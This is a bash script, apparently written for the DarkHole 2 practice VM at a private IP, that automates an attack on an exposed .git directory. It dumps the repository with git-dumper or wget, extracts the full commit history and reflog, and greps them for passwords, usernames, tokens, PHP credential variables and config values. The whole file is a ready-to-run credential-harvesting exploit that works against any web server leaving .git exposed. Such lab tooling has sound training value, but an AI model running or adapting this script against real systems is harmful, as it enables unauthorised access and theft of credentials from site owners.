#!/bin/bash
#
# DarkHole 2 Auto Exploit Script
# Specific to 192.168.201.130
#

TARGET="${1:-192.168.201.130}"
GIT_URL="http://$TARGET/.git/"
TEMP_DIR=$(mktemp -d -t darkhole2_XXXXXX)
LOG_FILE="$TEMP_DIR/exploitation.log"

echo "================================================"
echo "DarkHole 2 Auto Exploit Script"
echo "Target: $TARGET"
echo "Temp dir: $TEMP_DIR"
echo "================================================"

log() {
    echo "$(date): $1" | tee -a "$LOG_FILE"
}

log "Starting exploitation of DarkHole 2 VM"

# Check if .git is exposed
log "Checking for .git exposure at $GIT_URL"
response=$(curl -s -o /dev/null -w "%{http_code}" "$GIT_URL")

if [ "$response" = "200" ] || [ "$response" = "403" ]; then
    log ".git directory found (HTTP $response)"
else
    log "ERROR: .git directory not accessible (HTTP $response)"
    exit 1
fi

# Check for required tools
log "Checking required tools..."
if ! command -v git-dumper &> /dev/null; then
    log "Installing git-dumper..."
    pip3 install git-dumper
fi

if ! command -v git &> /dev/null; then
    log "ERROR: git is not installed"
    exit 1
fi

# Download .git directory
log "Downloading .git directory using git-dumper..."
if git-dumper "$GIT_URL" "$TEMP_DIR" 2>> "$LOG_FILE"; then
    log "Successfully downloaded .git directory"
else
    log "git-dumper failed, trying wget alternative..."
    cd "$TEMP_DIR"
    wget -r --no-parent -q --reject "index.html*" "$GIT_URL" 2>> "$LOG_FILE"
    cd - > /dev/null
fi

# Analyze the repository
cd "$TEMP_DIR"

if [ ! -d ".git" ]; then
    log "ERROR: Downloaded content is not a git repository"
    exit 1
fi

log "Analyzing git repository..."

# Extract comprehensive git history
log "Extracting git log..."
git log --oneline > "$TEMP_DIR/commits.txt"
git log -p --all > "$TEMP_DIR/full_history.txt"
git reflog --all > "$TEMP_DIR/reflog.txt"

log "Found $(wc -l < "$TEMP_DIR/commits.txt") commits"

# Search for credentials
log "Searching for credentials..."

echo ""
echo "=== CREDENTIAL SEARCH RESULTS ==="
echo ""

# Search patterns specific to DarkHole 2
patterns=(
    "password"
    "username" 
    "admin"
    "secret"
    "key"
    "token"
    "database"
    "passwd"
    "pwd"
    "user.*pass"
    "admin.*password"
    "db_.*="
    "\$.*pass"
)

for pattern in "${patterns[@]}"; do
    echo "=== Pattern: $pattern ==="
    grep -n -i -E "$pattern" "$TEMP_DIR/full_history.txt" | \
    grep -v "Binary file" | \
    grep -v "+++ " | \
    grep -v "--- " | \
    head -10
    echo ""
done >> "$TEMP_DIR/pattern_matches.txt"

# Special search for username:password patterns
echo "=== USERNAME:PASSWORD PATTERNS ==="
grep -E "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}:[^[:space:]]+" "$TEMP_DIR/full_history.txt" | sort -u
grep -E "^[^:]+:[^[:space:]]{4,}" "$TEMP_DIR/full_history.txt" | grep -v "//" | grep -v "@@" | sort -u

# PHP specific patterns
echo "=== PHP VARIABLES ==="
grep -E '\$(user|pass|password|db|username)\s*=' "$TEMP_DIR/full_history.txt" | sort -u

# Config file patterns
echo "=== CONFIGURATION VALUES ==="
grep -E '(USER|PASS|PASSWORD|DB|HOST).*=' "$TEMP_DIR/full_history.txt" | sort -u

# Display summary
echo ""
echo "=== EXPLOITATION SUMMARY ==="
echo "Target: $TARGET"
echo "Log file: $LOG_FILE"
echo "Downloaded files: $TEMP_DIR"
echo ""
echo "Files created:"
ls -la "$TEMP_DIR"
echo ""
echo "Use these commands for manual analysis:"
echo "  cd $TEMP_DIR"
echo "  git log -p --all"
echo "  git reflog --all"

log "Exploitation completed"
